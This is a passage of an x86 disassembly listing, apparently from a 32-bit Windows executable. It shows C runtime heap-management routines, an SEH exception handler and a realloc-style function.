  4252b2:	mov    ebx,0x80000000
  4252b7:	jae    0x4252d3
  4252b9:	shr    ebx,cl
  4252bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4252be:	lea    ecx,[ecx+eax*1+0x4]
  4252c2:	not    ebx
  4252c4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  4252c8:	dec    BYTE PTR [ecx]
  4252ca:	jne    0x4252f2
  4252cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4252cf:	and    DWORD PTR [ecx],ebx
  4252d1:	jmp    0x4252f2
  4252d3:	add    ecx,0xffffffe0
  4252d6:	shr    ebx,cl
  4252d8:	mov    ecx,DWORD PTR [ebp-0x8]
  4252db:	lea    ecx,[ecx+eax*1+0x4]
  4252df:	not    ebx
  4252e1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4252e8:	dec    BYTE PTR [ecx]
  4252ea:	jne    0x4252f2
  4252ec:	mov    ecx,DWORD PTR [ebp+0x8]
  4252ef:	and    DWORD PTR [ecx+0x4],ebx
  4252f2:	mov    ecx,DWORD PTR [edi+0x8]
  4252f5:	mov    ebx,DWORD PTR [edi+0x4]
  4252f8:	mov    DWORD PTR [ecx+0x4],ebx
  4252fb:	mov    ecx,DWORD PTR [edi+0x4]
  4252fe:	mov    edi,DWORD PTR [edi+0x8]
  425301:	mov    DWORD PTR [ecx+0x8],edi
  425304:	mov    ecx,DWORD PTR [ebp+0x10]
  425307:	sub    ecx,esi
  425309:	add    DWORD PTR [ebp-0x4],ecx
  42530c:	cmp    DWORD PTR [ebp-0x4],0x0
  425310:	jle    0x4253bb
  425316:	mov    edi,DWORD PTR [ebp-0x4]
  425319:	mov    ecx,DWORD PTR [ebp+0xc]
  42531c:	sar    edi,0x4
  42531f:	dec    edi
  425320:	cmp    edi,0x3f
  425323:	lea    ecx,[ecx+esi*1-0x4]
  425327:	jbe    0x42532c
  425329:	push   0x3f
  42532b:	pop    edi
  42532c:	mov    ebx,DWORD PTR [ebp-0xc]
  42532f:	lea    ebx,[ebx+edi*8]
  425332:	mov    DWORD PTR [ebp+0x10],ebx
  425335:	mov    ebx,DWORD PTR [ebx+0x4]
  425338:	mov    DWORD PTR [ecx+0x4],ebx
  42533b:	mov    ebx,DWORD PTR [ebp+0x10]
  42533e:	mov    DWORD PTR [ecx+0x8],ebx
  425341:	mov    DWORD PTR [ebx+0x4],ecx
  425344:	mov    ebx,DWORD PTR [ecx+0x4]
  425347:	mov    DWORD PTR [ebx+0x8],ecx
  42534a:	mov    ebx,DWORD PTR [ecx+0x4]
  42534d:	cmp    ebx,DWORD PTR [ecx+0x8]
  425350:	jne    0x4253a9
  425352:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  425356:	mov    BYTE PTR [ebp+0x13],cl
  425359:	inc    cl
  42535b:	cmp    edi,0x20
  42535e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  425362:	jae    0x425380
  425364:	cmp    BYTE PTR [ebp+0x13],0x0
  425368:	jne    0x425378
  42536a:	mov    ecx,edi
  42536c:	mov    ebx,0x80000000
  425371:	shr    ebx,cl
  425373:	mov    ecx,DWORD PTR [ebp+0x8]
  425376:	or     DWORD PTR [ecx],ebx
  425378:	lea    eax,[eax+edx*4+0x44]
  42537c:	mov    ecx,edi
  42537e:	jmp    0x4253a0
  425380:	cmp    BYTE PTR [ebp+0x13],0x0
  425384:	jne    0x425396
  425386:	lea    ecx,[edi-0x20]
  425389:	mov    ebx,0x80000000
  42538e:	shr    ebx,cl
  425390:	mov    ecx,DWORD PTR [ebp+0x8]
  425393:	or     DWORD PTR [ecx+0x4],ebx
  425396:	lea    eax,[eax+edx*4+0xc4]
  42539d:	lea    ecx,[edi-0x20]
  4253a0:	mov    edx,0x80000000
  4253a5:	shr    edx,cl
  4253a7:	or     DWORD PTR [eax],edx
  4253a9:	mov    edx,DWORD PTR [ebp+0xc]
  4253ac:	mov    ecx,DWORD PTR [ebp-0x4]
  4253af:	lea    eax,[edx+esi*1-0x4]
  4253b3:	mov    DWORD PTR [eax],ecx
  4253b5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  4253b9:	jmp    0x4253be
  4253bb:	mov    edx,DWORD PTR [ebp+0xc]
  4253be:	lea    eax,[esi+0x1]
  4253c1:	mov    DWORD PTR [edx-0x4],eax
  4253c4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  4253c8:	jmp    0x425509
  4253cd:	xor    eax,eax
  4253cf:	jmp    0x42550c
  4253d4:	jge    0x425509
  4253da:	mov    ebx,DWORD PTR [ebp+0xc]
  4253dd:	sub    DWORD PTR [ebp+0x10],esi
  4253e0:	lea    ecx,[esi+0x1]
  4253e3:	mov    DWORD PTR [ebx-0x4],ecx
  4253e6:	lea    ebx,[ebx+esi*1-0x4]
  4253ea:	mov    esi,DWORD PTR [ebp+0x10]
  4253ed:	sar    esi,0x4
  4253f0:	dec    esi
  4253f1:	cmp    esi,0x3f
  4253f4:	mov    DWORD PTR [ebp+0xc],ebx
  4253f7:	mov    DWORD PTR [ebx-0x4],ecx
  4253fa:	jbe    0x4253ff
  4253fc:	push   0x3f
  4253fe:	pop    esi
  4253ff:	test   BYTE PTR [ebp-0x4],0x1
  425403:	jne    0x425489
  425409:	mov    esi,DWORD PTR [ebp-0x4]
  42540c:	sar    esi,0x4
  42540f:	dec    esi
  425410:	cmp    esi,0x3f
  425413:	jbe    0x425418
  425415:	push   0x3f
  425417:	pop    esi
  425418:	mov    ecx,DWORD PTR [edi+0x4]
  42541b:	cmp    ecx,DWORD PTR [edi+0x8]
  42541e:	jne    0x425462
  425420:	cmp    esi,0x20
  425423:	mov    ebx,0x80000000
  425428:	jae    0x425443
  42542a:	mov    ecx,esi
  42542c:	shr    ebx,cl
  42542e:	lea    esi,[esi+eax*1+0x4]
  425432:	not    ebx
  425434:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425438:	dec    BYTE PTR [esi]
  42543a:	jne    0x42545f
  42543c:	mov    ecx,DWORD PTR [ebp+0x8]
  42543f:	and    DWORD PTR [ecx],ebx
  425441:	jmp    0x42545f
  425443:	lea    ecx,[esi-0x20]
  425446:	shr    ebx,cl
  425448:	lea    ecx,[esi+eax*1+0x4]
  42544c:	not    ebx
  42544e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425455:	dec    BYTE PTR [ecx]
  425457:	jne    0x42545f
  425459:	mov    ecx,DWORD PTR [ebp+0x8]
  42545c:	and    DWORD PTR [ecx+0x4],ebx
  42545f:	mov    ebx,DWORD PTR [ebp+0xc]
  425462:	mov    ecx,DWORD PTR [edi+0x8]
  425465:	mov    esi,DWORD PTR [edi+0x4]
  425468:	mov    DWORD PTR [ecx+0x4],esi
  42546b:	mov    esi,DWORD PTR [edi+0x8]
  42546e:	mov    ecx,DWORD PTR [edi+0x4]
  425471:	mov    DWORD PTR [ecx+0x8],esi
  425474:	mov    esi,DWORD PTR [ebp+0x10]
  425477:	add    esi,DWORD PTR [ebp-0x4]
  42547a:	mov    DWORD PTR [ebp+0x10],esi
  42547d:	sar    esi,0x4
  425480:	dec    esi
  425481:	cmp    esi,0x3f
  425484:	jbe    0x425489
  425486:	push   0x3f
  425488:	pop    esi
  425489:	mov    ecx,DWORD PTR [ebp-0xc]
  42548c:	lea    ecx,[ecx+esi*8]
  42548f:	mov    edi,DWORD PTR [ecx+0x4]
  425492:	mov    DWORD PTR [ebx+0x8],ecx
  425495:	mov    DWORD PTR [ebx+0x4],edi
  425498:	mov    DWORD PTR [ecx+0x4],ebx
  42549b:	mov    ecx,DWORD PTR [ebx+0x4]
  42549e:	mov    DWORD PTR [ecx+0x8],ebx
  4254a1:	mov    ecx,DWORD PTR [ebx+0x4]
  4254a4:	cmp    ecx,DWORD PTR [ebx+0x8]
  4254a7:	jne    0x425500
  4254a9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4254ad:	mov    BYTE PTR [ebp+0xf],cl
  4254b0:	inc    cl
  4254b2:	cmp    esi,0x20
  4254b5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4254b9:	jae    0x4254d7
  4254bb:	cmp    BYTE PTR [ebp+0xf],0x0
  4254bf:	jne    0x4254cf
  4254c1:	mov    ecx,esi
  4254c3:	mov    edi,0x80000000
  4254c8:	shr    edi,cl
  4254ca:	mov    ecx,DWORD PTR [ebp+0x8]
  4254cd:	or     DWORD PTR [ecx],edi
  4254cf:	lea    eax,[eax+edx*4+0x44]
  4254d3:	mov    ecx,esi
  4254d5:	jmp    0x4254f7
  4254d7:	cmp    BYTE PTR [ebp+0xf],0x0
  4254db:	jne    0x4254ed
  4254dd:	lea    ecx,[esi-0x20]
  4254e0:	mov    edi,0x80000000
  4254e5:	shr    edi,cl
  4254e7:	mov    ecx,DWORD PTR [ebp+0x8]
  4254ea:	or     DWORD PTR [ecx+0x4],edi
  4254ed:	lea    eax,[eax+edx*4+0xc4]
  4254f4:	lea    ecx,[esi-0x20]
  4254f7:	mov    edx,0x80000000
  4254fc:	shr    edx,cl
  4254fe:	or     DWORD PTR [eax],edx
  425500:	mov    eax,DWORD PTR [ebp+0x10]
  425503:	mov    DWORD PTR [ebx],eax
  425505:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425509:	xor    eax,eax
  42550b:	inc    eax
  42550c:	pop    edi
  42550d:	pop    esi
  42550e:	pop    ebx
  42550f:	leave  
  425510:	ret    
  425511:	push   ebp
  425512:	mov    ebp,esp
  425514:	sub    esp,0x14
  425517:	mov    ecx,DWORD PTR [ebp+0x8]
  42551a:	mov    eax,ds:0x46613c
  42551f:	mov    edx,DWORD PTR ds:0x466140
  425525:	add    ecx,0x17
  425528:	and    ecx,0xfffffff0
  42552b:	push   ebx
  42552c:	mov    DWORD PTR [ebp-0x10],ecx
  42552f:	sar    ecx,0x4
  425532:	push   esi
  425533:	lea    eax,[eax+eax*4]
  425536:	push   edi
  425537:	dec    ecx
  425538:	cmp    ecx,0x20
  42553b:	lea    edi,[edx+eax*4]
  42553e:	mov    DWORD PTR [ebp-0x4],edi
  425541:	jge    0x42554e
  425543:	or     esi,0xffffffff
  425546:	shr    esi,cl
  425548:	or     DWORD PTR [ebp-0x8],0xffffffff
  42554c:	jmp    0x42555b
  42554e:	add    ecx,0xffffffe0
  425551:	or     eax,0xffffffff
  425554:	xor    esi,esi
  425556:	shr    eax,cl
  425558:	mov    DWORD PTR [ebp-0x8],eax
  42555b:	mov    eax,ds:0x466148
  425560:	mov    ebx,eax
  425562:	mov    DWORD PTR [ebp-0xc],esi
  425565:	cmp    ebx,edi
  425567:	jmp    0x42557d
  425569:	mov    ecx,DWORD PTR [ebx+0x4]
  42556c:	mov    edi,DWORD PTR [ebx]
  42556e:	and    ecx,DWORD PTR [ebp-0x8]
  425571:	and    edi,esi
  425573:	or     ecx,edi
  425575:	jne    0x425582
  425577:	add    ebx,0x14
  42557a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42557d:	mov    DWORD PTR [ebp+0x8],ebx
  425580:	jb     0x425569
  425582:	cmp    ebx,DWORD PTR [ebp-0x4]
  425585:	jne    0x4255ab
  425587:	mov    ebx,edx
  425589:	jmp    0x42559c
  42558b:	mov    ecx,DWORD PTR [ebx+0x4]
  42558e:	mov    edi,DWORD PTR [ebx]
  425590:	and    ecx,DWORD PTR [ebp-0x8]
  425593:	and    edi,esi
  425595:	or     ecx,edi
  425597:	jne    0x4255a3
  425599:	add    ebx,0x14
  42559c:	cmp    ebx,eax
  42559e:	mov    DWORD PTR [ebp+0x8],ebx
  4255a1:	jb     0x42558b
  4255a3:	cmp    ebx,eax
  4255a5:	je     0x42563f
  4255ab:	mov    DWORD PTR ds:0x466148,ebx
  4255b1:	mov    eax,DWORD PTR [ebx+0x10]
  4255b4:	mov    edx,DWORD PTR [eax]
  4255b6:	cmp    edx,0xffffffff
  4255b9:	mov    DWORD PTR [ebp-0x4],edx
  4255bc:	je     0x4255d2
  4255be:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4255c5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4255c9:	and    ecx,DWORD PTR [ebp-0x8]
  4255cc:	and    edi,esi
  4255ce:	or     ecx,edi
  4255d0:	jne    0x425608
  4255d2:	mov    edx,DWORD PTR [eax+0xc4]
  4255d8:	and    edx,DWORD PTR [ebp-0x8]
  4255db:	and    DWORD PTR [ebp-0x4],0x0
  4255df:	lea    ecx,[eax+0x44]
  4255e2:	mov    esi,DWORD PTR [ecx]
  4255e4:	and    esi,DWORD PTR [ebp-0xc]
  4255e7:	or     edx,esi
  4255e9:	mov    esi,DWORD PTR [ebp-0xc]
  4255ec:	jne    0x425605
  4255ee:	mov    edx,DWORD PTR [ecx+0x84]
  4255f4:	and    edx,DWORD PTR [ebp-0x8]
  4255f7:	inc    DWORD PTR [ebp-0x4]
  4255fa:	add    ecx,0x4
  4255fd:	mov    edi,DWORD PTR [ecx]
  4255ff:	and    edi,esi
  425601:	or     edx,edi
  425603:	je     0x4255ee
  425605:	mov    edx,DWORD PTR [ebp-0x4]
  425608:	mov    ecx,edx
  42560a:	imul   ecx,ecx,0x204
  425610:	lea    ecx,[ecx+eax*1+0x144]
  425617:	mov    DWORD PTR [ebp-0xc],ecx
  42561a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42561e:	xor    edi,edi
  425620:	and    ecx,esi
  425622:	jne    0x425691
  425624:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42562b:	and    ecx,DWORD PTR [ebp-0x8]
  42562e:	push   0x20
  425630:	pop    edi
  425631:	jmp    0x425691
  425633:	cmp    DWORD PTR [ebx+0x8],0x0
  425637:	jne    0x425644
  425639:	add    ebx,0x14
  42563c:	mov    DWORD PTR [ebp+0x8],ebx
  42563f:	cmp    ebx,DWORD PTR [ebp-0x4]
  425642:	jb     0x425633
  425644:	cmp    ebx,DWORD PTR [ebp-0x4]
  425647:	jne    0x42566f
  425649:	mov    ebx,edx
  42564b:	jmp    0x425656
  42564d:	cmp    DWORD PTR [ebx+0x8],0x0
  425651:	jne    0x42565d
  425653:	add    ebx,0x14
  425656:	cmp    ebx,eax
  425658:	mov    DWORD PTR [ebp+0x8],ebx
  42565b:	jb     0x42564d
  42565d:	cmp    ebx,eax
  42565f:	jne    0x42566f
  425661:	call   0x425075
  425666:	mov    ebx,eax
  425668:	test   ebx,ebx
  42566a:	mov    DWORD PTR [ebp+0x8],ebx
  42566d:	je     0x425687
  42566f:	push   ebx
  425670:	call   0x42512c
  425675:	pop    ecx
  425676:	mov    ecx,DWORD PTR [ebx+0x10]
  425679:	mov    DWORD PTR [ecx],eax
  42567b:	mov    eax,DWORD PTR [ebx+0x10]
  42567e:	cmp    DWORD PTR [eax],0xffffffff
  425681:	jne    0x4255ab
  425687:	xor    eax,eax
  425689:	jmp    0x425808
  42568e:	shl    ecx,1
  425690:	inc    edi
  425691:	test   ecx,ecx
  425693:	jge    0x42568e
  425695:	mov    ecx,DWORD PTR [ebp-0xc]
  425698:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42569c:	mov    ecx,DWORD PTR [edx]
  42569e:	sub    ecx,DWORD PTR [ebp-0x10]
  4256a1:	mov    esi,ecx
  4256a3:	sar    esi,0x4
  4256a6:	dec    esi
  4256a7:	cmp    esi,0x3f
  4256aa:	mov    DWORD PTR [ebp-0x8],ecx
  4256ad:	jle    0x4256b2
  4256af:	push   0x3f
  4256b1:	pop    esi
  4256b2:	cmp    esi,edi
  4256b4:	je     0x4257bb
  4256ba:	mov    ecx,DWORD PTR [edx+0x4]
  4256bd:	cmp    ecx,DWORD PTR [edx+0x8]
  4256c0:	jne    0x42571e
  4256c2:	cmp    edi,0x20
  4256c5:	mov    ebx,0x80000000
  4256ca:	jge    0x4256f2
  4256cc:	mov    ecx,edi
  4256ce:	shr    ebx,cl
  4256d0:	mov    ecx,DWORD PTR [ebp-0x4]
  4256d3:	lea    edi,[eax+edi*1+0x4]
  4256d7:	not    ebx
  4256d9:	mov    DWORD PTR [ebp-0x14],ebx
  4256dc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4256e0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4256e4:	dec    BYTE PTR [edi]
  4256e6:	jne    0x42571b
  4256e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4256eb:	mov    ebx,DWORD PTR [ebp+0x8]
  4256ee:	and    DWORD PTR [ebx],ecx
  4256f0:	jmp    0x42571e
  4256f2:	lea    ecx,[edi-0x20]
  4256f5:	shr    ebx,cl
  4256f7:	mov    ecx,DWORD PTR [ebp-0x4]
  4256fa:	lea    ecx,[eax+ecx*4+0xc4]
  425701:	lea    edi,[eax+edi*1+0x4]
  425705:	not    ebx
  425707:	and    DWORD PTR [ecx],ebx
  425709:	dec    BYTE PTR [edi]
  42570b:	mov    DWORD PTR [ebp-0x14],ebx
  42570e:	jne    0x42571b
  425710:	mov    ebx,DWORD PTR [ebp+0x8]
  425713:	mov    ecx,DWORD PTR [ebp-0x14]
  425716:	and    DWORD PTR [ebx+0x4],ecx
  425719:	jmp    0x42571e
  42571b:	mov    ebx,DWORD PTR [ebp+0x8]
  42571e:	cmp    DWORD PTR [ebp-0x8],0x0
  425722:	mov    ecx,DWORD PTR [edx+0x8]
  425725:	mov    edi,DWORD PTR [edx+0x4]
  425728:	mov    DWORD PTR [ecx+0x4],edi
  42572b:	mov    ecx,DWORD PTR [edx+0x4]
  42572e:	mov    edi,DWORD PTR [edx+0x8]
  425731:	mov    DWORD PTR [ecx+0x8],edi
  425734:	je     0x4257c7
  42573a:	mov    ecx,DWORD PTR [ebp-0xc]
  42573d:	lea    ecx,[ecx+esi*8]
  425740:	mov    edi,DWORD PTR [ecx+0x4]
  425743:	mov    DWORD PTR [edx+0x8],ecx
  425746:	mov    DWORD PTR [edx+0x4],edi
  425749:	mov    DWORD PTR [ecx+0x4],edx
  42574c:	mov    ecx,DWORD PTR [edx+0x4]
  42574f:	mov    DWORD PTR [ecx+0x8],edx
  425752:	mov    ecx,DWORD PTR [edx+0x4]
  425755:	cmp    ecx,DWORD PTR [edx+0x8]
  425758:	jne    0x4257b8
  42575a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42575e:	mov    BYTE PTR [ebp+0xb],cl
  425761:	inc    cl
  425763:	cmp    esi,0x20
  425766:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42576a:	jge    0x42578f
  42576c:	cmp    BYTE PTR [ebp+0xb],0x0
  425770:	jne    0x42577d
  425772:	mov    edi,0x80000000
  425777:	mov    ecx,esi
  425779:	shr    edi,cl
  42577b:	or     DWORD PTR [ebx],edi
  42577d:	mov    ecx,esi
  42577f:	mov    edi,0x80000000
  425784:	shr    edi,cl
  425786:	mov    ecx,DWORD PTR [ebp-0x4]
  425789:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42578d:	jmp    0x4257b8
  42578f:	cmp    BYTE PTR [ebp+0xb],0x0
  425793:	jne    0x4257a2
  425795:	lea    ecx,[esi-0x20]
  425798:	mov    edi,0x80000000
  42579d:	shr    edi,cl
  42579f:	or     DWORD PTR [ebx+0x4],edi
  4257a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4257a5:	lea    edi,[eax+ecx*4+0xc4]
  4257ac:	lea    ecx,[esi-0x20]
  4257af:	mov    esi,0x80000000
  4257b4:	shr    esi,cl
  4257b6:	or     DWORD PTR [edi],esi
  4257b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4257bb:	test   ecx,ecx
  4257bd:	je     0x4257ca
  4257bf:	mov    DWORD PTR [edx],ecx
  4257c1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4257c5:	jmp    0x4257ca
  4257c7:	mov    ecx,DWORD PTR [ebp-0x8]
  4257ca:	mov    esi,DWORD PTR [ebp-0x10]
  4257cd:	add    edx,ecx
  4257cf:	lea    ecx,[esi+0x1]
  4257d2:	mov    DWORD PTR [edx],ecx
  4257d4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4257d8:	mov    esi,DWORD PTR [ebp-0xc]
  4257db:	mov    ecx,DWORD PTR [esi]
  4257dd:	test   ecx,ecx
  4257df:	lea    edi,[ecx+0x1]
  4257e2:	mov    DWORD PTR [esi],edi
  4257e4:	jne    0x425800
  4257e6:	cmp    ebx,DWORD PTR ds:0x466138
  4257ec:	jne    0x425800
  4257ee:	mov    ecx,DWORD PTR [ebp-0x4]
  4257f1:	cmp    ecx,DWORD PTR ds:0x466150
  4257f7:	jne    0x425800
  4257f9:	and    DWORD PTR ds:0x466138,0x0
  425800:	mov    ecx,DWORD PTR [ebp-0x4]
  425803:	mov    DWORD PTR [eax],ecx
  425805:	lea    eax,[edx+0x4]
  425808:	pop    edi
  425809:	pop    esi
  42580a:	pop    ebx
  42580b:	leave  
  42580c:	ret    
  42580d:	int3   
  42580e:	int3   
  42580f:	int3   
  425810:	push   esi
  425811:	inc    ebx
  425812:	xor    dh,BYTE PTR [eax]
  425814:	pop    eax
  425815:	inc    ebx
  425816:	xor    BYTE PTR [eax],dh
  425818:	push   ebp
  425819:	mov    ebp,esp
  42581b:	sub    esp,0x8
  42581e:	push   ebx
  42581f:	push   esi
  425820:	push   edi
  425821:	push   ebp
  425822:	cld    
  425823:	mov    ebx,DWORD PTR [ebp+0xc]
  425826:	mov    eax,DWORD PTR [ebp+0x8]
  425829:	test   DWORD PTR [eax+0x4],0x6
  425830:	jne    0x4258b8
  425836:	mov    DWORD PTR [ebp-0x8],eax
  425839:	mov    eax,DWORD PTR [ebp+0x10]
  42583c:	mov    DWORD PTR [ebp-0x4],eax
  42583f:	lea    eax,[ebp-0x8]
  425842:	mov    DWORD PTR [ebx-0x4],eax
  425845:	mov    esi,DWORD PTR [ebx+0xc]
  425848:	mov    edi,DWORD PTR [ebx+0x8]
  42584b:	cmp    esi,0xffffffff
  42584e:	je     0x4258b1
  425850:	lea    ecx,[esi+esi*2]
  425853:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  425858:	je     0x42589f
  42585a:	push   esi
  42585b:	push   ebp
  42585c:	lea    ebp,[ebx+0x10]
  42585f:	call   DWORD PTR [edi+ecx*4+0x4]
  425863:	pop    ebp
  425864:	pop    esi
  425865:	mov    ebx,DWORD PTR [ebp+0xc]
  425868:	or     eax,eax
  42586a:	je     0x42589f
  42586c:	js     0x4258aa
  42586e:	mov    edi,DWORD PTR [ebx+0x8]
  425871:	push   ebx
  425872:	call   0x4267a0
  425877:	add    esp,0x4
  42587a:	lea    ebp,[ebx+0x10]
  42587d:	push   esi
  42587e:	push   ebx
  42587f:	call   0x4267e2
  425884:	add    esp,0x8
  425887:	lea    ecx,[esi+esi*2]
  42588a:	push   0x1
  42588c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  425890:	call   0x426876
  425895:	mov    eax,DWORD PTR [edi+ecx*4]
  425898:	mov    DWORD PTR [ebx+0xc],eax
  42589b:	call   DWORD PTR [edi+ecx*4+0x8]
  42589f:	mov    edi,DWORD PTR [ebx+0x8]
  4258a2:	lea    ecx,[esi+esi*2]
  4258a5:	mov    esi,DWORD PTR [edi+ecx*4]
  4258a8:	jmp    0x42584b
  4258aa:	mov    eax,0x0
  4258af:	jmp    0x4258cd
  4258b1:	mov    eax,0x1
  4258b6:	jmp    0x4258cd
  4258b8:	push   ebp
  4258b9:	lea    ebp,[ebx+0x10]
  4258bc:	push   0xffffffff
  4258be:	push   ebx
  4258bf:	call   0x4267e2
  4258c4:	add    esp,0x8
  4258c7:	pop    ebp
  4258c8:	mov    eax,0x1
  4258cd:	pop    ebp
  4258ce:	pop    edi
  4258cf:	pop    esi
  4258d0:	pop    ebx
  4258d1:	mov    esp,ebp
  4258d3:	pop    ebp
  4258d4:	ret    
  4258d5:	push   ebp
  4258d6:	mov    ecx,DWORD PTR [esp+0x8]
  4258da:	mov    ebp,DWORD PTR [ecx]
  4258dc:	mov    eax,DWORD PTR [ecx+0x1c]
  4258df:	push   eax
  4258e0:	mov    eax,DWORD PTR [ecx+0x18]
  4258e3:	push   eax
  4258e4:	call   0x4267e2
  4258e9:	add    esp,0x8
  4258ec:	pop    ebp
  4258ed:	ret    0x4
  4258f0:	call   0x423803
  4258f5:	add    eax,0x8
  4258f8:	ret    
  4258f9:	push   0x14
  4258fb:	push   0x4287b8
  425900:	call   0x423950
  425905:	mov    edi,DWORD PTR [ebp+0x8]
  425908:	xor    ebx,ebx
  42590a:	cmp    edi,ebx
  42590c:	jne    0x42591c
  42590e:	push   DWORD PTR [ebp+0xc]
  425911:	call   0x424672
  425916:	pop    ecx
  425917:	jmp    0x425aa0
  42591c:	mov    esi,DWORD PTR [ebp+0xc]
  42591f:	cmp    esi,ebx
  425921:	jne    0x42592f
  425923:	push   edi
  425924:	call   0x42455a
  425929:	pop    ecx
  42592a:	jmp    0x425a9e
  42592f:	cmp    DWORD PTR ds:0x466384,0x3
  425936:	jne    0x425a6a
  42593c:	mov    DWORD PTR [ebp-0x1c],ebx
  42593f:	cmp    esi,0xffffffe0
  425942:	ja     0x425a39
  425948:	push   0x4
  42594a:	call   0x423b0f
  42594f:	pop    ecx
  425950:	mov    DWORD PTR [ebp-0x4],ebx
  425953:	push   edi
  425954:	call   0x424d32
  425959:	pop    ecx
  42595a:	mov    DWORD PTR [ebp-0x20],eax
  42595d:	cmp    eax,ebx
  42595f:	je     0x425a09
  425965:	cmp    esi,DWORD PTR ds:0x466144
  42596b:	ja     0x4259b9
  42596d:	push   esi
  42596e:	push   edi
  42596f:	push   eax
  425970:	call   0x425232
  425975:	add    esp,0xc
  425978:	test   eax,eax
  42597a:	je     0x425981
  42597c:	mov    DWORD PTR [ebp-0x1c],edi
  42597f:	jmp    0x4259b9
  425981:	push   esi
  425982:	call   0x425511
  425987:	pop    ecx
  425988:	mov    DWORD PTR [ebp-0x1c],eax
  42598b:	cmp    eax,ebx
  42598d:	je     0x4259b9
  42598f:	mov    eax,DWORD PTR [edi-0x4]
  425992:	dec    eax
  425993:	mov    DWORD PTR [ebp-0x24],eax
  425996:	cmp    eax,esi
  425998:	jb     0x42599c
  42599a:	mov    eax,esi
  42599c:	push   eax
  42599d:	push   edi
  42599e:	push   DWORD PTR [ebp-0x1c]
  4259a1:	call   0x424690
  4259a6:	push   edi
  4259a7:	call   0x424d32
  4259ac:	mov    DWORD PTR [ebp-0x20],eax
  4259af:	push   edi
  4259b0:	push   eax
  4259b1:	call   0x424d5d
  4259b6:	add    esp,0x18
  4259b9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4259bc:	jne    0x425a09
  4259be:	cmp    esi,ebx
  4259c0:	jne    0x4259c8
  4259c2:	xor    esi,esi
  4259c4:	inc    esi
  4259c5:	mov    DWORD PTR [ebp+0xc],esi
  4259c8:	add    esi,0xf
  4259cb:	and    esi,0xfffffff0
  4259ce:	mov    DWORD PTR [ebp+0xc],esi
  4259d1:	push   esi
  4259d2:	push   ebx
  4259d3:	push   DWORD PTR ds:0x466380
  4259d9:	call   DWORD PTR ds:0x428030
  4259df:	mov    DWORD PTR [ebp-0x1c],eax
  4259e2:	cmp    eax,ebx
  4259e4:	je     0x425a09
  4259e6:	mov    eax,DWORD PTR [edi-0x4]
  4259e9:	dec    eax
  4259ea:	mov    DWORD PTR [ebp-0x24],eax
  4259ed:	cmp    eax,esi
  4259ef:	jb     0x4259f3
  4259f1:	mov    eax,esi
  4259f3:	push   eax
  4259f4:	push   edi
  4259f5:	push   DWORD PTR [ebp-0x1c]
  4259f8:	call   0x424690
  4259fd:	push   edi
  4259fe:	push   DWORD PTR [ebp-0x20]
  425a01:	call   0x424d5d
  425a06:	add    esp,0x14
  425a09:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a0d:	call   0x425a61
  425a12:	cmp    DWORD PTR [ebp-0x20],ebx
  425a15:	jne    0x425a39
  425a17:	cmp    esi,ebx
  425a19:	jne    0x425a1e
  425a1b:	xor    esi,esi
  425a1d:	inc    esi
  425a1e:	add    esi,0xf
  425a21:	and    esi,0xfffffff0
  425a24:	mov    DWORD PTR [ebp+0xc],esi
  425a27:	push   esi
  425a28:	push   edi
  425a29:	push   ebx
  425a2a:	push   DWORD PTR ds:0x466380
  425a30:	call   DWORD PTR ds:0x4280e8
  425a36:	mov    DWORD PTR [ebp-0x1c],eax
  425a39:	mov    eax,DWORD PTR [ebp-0x1c]
  425a3c:	cmp    eax,ebx
  425a3e:	jne    0x425aa0
  425a40:	cmp    DWORD PTR ds:0x466008,ebx
  425a46:	je     0x425aa0
  425a48:	push   esi
  425a49:	call   0x426232
  425a4e:	pop    ecx
  425a4f:	test   eax,eax
  425a51:	jne    0x42593c
  425a57:	jmp    0x425a9e
  425a59:	xor    ebx,ebx
  425a5b:	mov    esi,DWORD PTR [ebp+0xc]
  425a5e:	mov    edi,DWORD PTR [ebp+0x8]
  425a61:	push   0x4
  425a63:	call   0x423a7b
  425a68:	pop    ecx
  425a69:	ret    
  425a6a:	xor    eax,eax
  425a6c:	cmp    esi,0xffffffe0
  425a6f:	ja     0x425a87
  425a71:	cmp    esi,ebx
  425a73:	jne    0x425a78
  425a75:	xor    esi,esi
  425a77:	inc    esi
  425a78:	push   esi
  425a79:	push   edi
  425a7a:	push   ebx
  425a7b:	push   DWORD PTR ds:0x466380
  425a81:	call   DWORD PTR ds:0x4280e8
  425a87:	cmp    eax,ebx
  425a89:	jne    0x425aa0
  425a8b:	cmp    DWORD PTR ds:0x466008,ebx
  425a91:	je     0x425aa0
  425a93:	push   esi
  425a94:	call   0x426232
  425a99:	pop    ecx
  425a9a:	test   eax,eax
  425a9c:	jne    0x425a6a
  425a9e:	xor    eax,eax
  425aa0:	call   0x42398b
  425aa5:	ret    
  425aa6:	push   0x10
  425aa8:	push   0x4287c8
